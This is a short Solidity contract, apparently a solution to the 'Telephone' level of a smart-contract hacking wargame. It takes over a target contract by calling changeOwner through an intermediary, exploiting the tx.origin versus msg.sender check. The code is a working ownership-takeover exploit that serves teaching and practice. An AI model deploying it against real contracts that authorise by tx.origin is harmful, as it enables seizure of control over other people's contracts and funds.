// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

import "./Telephone.sol";

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public onlyHacker {
    /// tx.origin == hacker, msg.sender == address(this) when the target function is called.
    Telephone(_target).changeOwner(msg.sender);
  }
}
